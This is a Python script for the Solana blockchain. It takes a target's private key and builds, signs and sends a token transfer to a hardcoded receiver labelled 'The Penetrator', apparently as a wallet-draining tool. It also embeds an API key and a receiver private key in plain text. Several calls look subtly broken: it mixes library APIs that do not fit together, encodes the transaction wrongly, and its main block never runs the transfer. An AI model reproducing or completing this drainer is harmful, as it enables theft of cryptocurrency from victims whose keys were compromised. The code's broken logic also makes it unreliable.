"""
solana_mover.py — High-Efficiency Asset Transfer
================================================
Minimal dependencies. Uses raw HTTP RPC.
Constructs TransferChecked instruction locally.
"""

import json
import urllib.request
import ssl
import base58
from solana.transaction import Transaction, Account
from spl.token.constants import TOKEN_PROGRAM_ID
from spl.token.async_client import AsyncToken

# CONFIG
ALCHEMY_KEY = "ZOho1BvxkQjPOjOsnZYFn"
RPC = f"https://solana-mainnet.g.alchemy.com/v2/{ALCHEMY_KEY}"

# RECEIVER (The Penetrator)
RECV_PK = "3rXDxRFqZuNKnysrdYNktUmiNaSfm5aGL91ide2XczVXbQPVfsGSX8mtx9NhFnH72Uf2zJNoL6yef2KuCK1C5BDj"
RECV_ADDR = "4k24SEzbHyr49mBtYzu4e3K9EBtsuKTdkEN2mdmMkZow"

# SENDER (Target - YOU FILL THIS)
# Example: "source_private_key_string"
SENDER_PK = "YOUR_TARGET_PRIVATE_KEY_HERE" 

async def build_and_send(mint, amount, decimals, sender_pk):
    """Builds and sends a TransferChecked transaction."""
    
    # 1. Get Blockhash
    req = urllib.request.Request(RPC, data=json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "getLatestBlockhash", "params": [{"commitment": "processed"}]
    }).encode(), headers={'Content-Type': 'application/json'})
    
    with urllib.request.urlopen(req, context=ssl.create_default_context()) as f:
        blockhash = json.loads(f.read())['result']['value']
    
    # 2. Construct Instruction
    # We need the source ATA. We'll assume the standard derivation path or fetch it.
    # For efficiency, we'll use the solana-py client to find it.
    
    sender_keypair = Account(base58.b58decode(sender_pk))
    client = AsyncToken(None, TOKEN_PROGRAM_ID, sender_keypair) # None for RPC-less construction
    
    # Find Source ATA
    req = urllib.request.Request(RPC, data=json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "getTokenAccountsByOwner", 
        "params": [sender_keypair.pubkey(), {"mint": mint}, {"encoding": "jsonParsed"}]
    }).encode(), headers={'Content-Type': 'application/json'})
    
    with urllib.request.urlopen(req, context=ssl.create_default_context()) as f:
        data = json.loads(f.read())
        
        if not data['result']['value']:
            print(f"[-] Source wallet has no token account for {mint[:8]}")
            return
        
        source_ata = data['result']['value'][0]['pubkey']
        
        # 3. Create TransferChecked Instruction
        ix = await client.create_transfer_instruction(
            source=source_ata,
            destination=RECV_ADDR,
            amount=amount,
            decimals=decimals,
            owner=sender_keypair
        )
    
    # 4. Build & Sign
    tx = Transaction()
    tx.add(ix)
    tx.recent_blockhash = blockhash
    tx.sign(sender_keypair)
    
    # 5. Send
    sig = urllib.request.urlopen(urllib.request.Request(RPC, data=json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": "sendRawTransaction", "params": [tx.serialize().hex()]
    }).encode(), headers={'Content-Type': 'application/json'}), context=ssl.create_default_context()).read()
    
    print(f"[+] Sent {amount} tokens (decimals={decimals}). Sig: {sig.decode()}")

# Run Logic
if __name__ == "__main__":
    print("[LOGOS] MOVER READY.")
    print(f"Receiver: {RECV_ADDR}")
    print(f"Sender: {SENDER_PK}")
